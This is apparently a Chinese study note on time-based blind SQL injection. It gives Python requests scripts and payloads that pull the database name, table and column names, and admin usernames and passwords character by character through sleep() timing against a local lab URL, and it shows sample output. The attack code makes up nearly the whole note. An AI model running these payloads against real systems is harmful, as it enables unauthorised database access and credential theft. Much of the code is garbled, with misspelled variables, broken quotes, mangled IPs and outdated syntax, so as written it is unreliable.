# ==延时盲注Python自动化利用==

**利用过程：1.寻找Payload + 绕过技巧    2.Python 自动化请求 url+payload 通过超时判断是否正确**

```python
import requests
dic ="abcdefghijklmnopqrstuvwxyz0123456789_"
flag = ""
for i in range(1,20):
    for c in dic:
        url =“用户自定义URL"
        payload ="用户自定义 替换其中的数值"
        url = url + payload
        try:
            response = requests.get(url=url,timeout=3)
        except requests.exceptions.ReadTimeout,e:
          	flag = flag +c
            print(flag)
print(flag)            
```

## 数据库名称

```python
import requests
dic ="abcdefghijklmnopqrstuvwxyz0123456789_"
flag = ""

for i in range(1,8):
    for ehar in dic:
        url ="http://192.168.8.101/01SQL/09Table-Sleep/?id=1"
        paylaad ="and if((substr(detabase()," + str(i) +",1)='"+ char +"'),sleep(3),0)"
        url = url + payload
        print(ur1)
        try:
			r = requests.get(unl=url,timeout=3)
        except:
			flag = flag+char
			print(flag)
print(flag)            
```

## 数据表名称

```python
payload：
and if((substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1)= 'a'), sleep(3),0)


dic ="abcdefghijklmnopqrstuvwxyz0123456789_"
for table_num in range(0,2):
    flag = " "
    for char_num in range(1,11):
        for char in dic:
            url ="http://192.168..101/1SOL/09Table-Sleep/?id=1" 
            payload = " and if((substr((select table_name from information_schema.tables where table_schema=database() limit "+str(table num)+"1),"+str(char_num)+",1)='"+char+"'),sleep(3),0)"
            url = url + payload
            try:
				r = requests.get(url=ur1,timeout=3 )
            except :
				flag = flag + char
				print(flag)
	print('table_name: ' + flag)
    
输出结果：
a
ad
adm
admi
admin
table_name:admin
p
pe
per
pers
perso
person
table_name: person
```



## 字段名称

```python
payload:
and if((substr((select column_name from information_schema.columns where table_name='admin’ limit 0,1),1,1)= 'i'),sleep(3),0)

import requests
dic ="abcdefghijklmnopqrstuvwxyz0123456789_"
                
for column_num in range(0,3): 
    flag = "" 
    for char_num in range(1,11):
        for char in dic:
            url ="http://192.168.0.101/01SQL/09Table-Sleep/?id=1"
            payload =  and if((substr((select column_name from information_schema.columnswhere table_name='admin' limit " + str(column_num) + ",1)," + str(char-num) + " 1)= '" + char +"'), sleep(3),0)"
             url = url + payload
             try:
r = requests.get(url=url,timeout=3)
             except:
                flag = flag + char
				print(flag)
    print('column_name: ' + flag )  
输出结果：
i
id
column_name: id
u                
Us
use
user
usern
userna
usernam
username
column_name: username               
```



## 字段内容获取

```python
payload:and if((substr((select password from admin limit 0,1),1,1)='f'),sleep(3),@)

import requests
dic ="abcdefghijklmnopqrstuvwxyz0123456789_{}"

for record_num in range(0,2):
    for item in ['id','username','password']:
     flag =""
     for i in range(1,10) :
         for char in dic:
             url ="http://192.168.8.181/81SQL/09Table-Sleep/?id=1"
             payload = " and if((substr((select "+item+" from admin limit "+str(record_num)+",1),"+str(i)+",1)='"+char+'),sleep(3),0)"
             url = url + payload  
             try:
				r = requests.get(url=url,timeout=3)
             except :
                flag = flag + char
                print(flag)
         print("content:" + flag)
        
输出结果：

```

**总结：**

**1.Python request库的调用**

**2.Python基于时间盲注的自动化利用**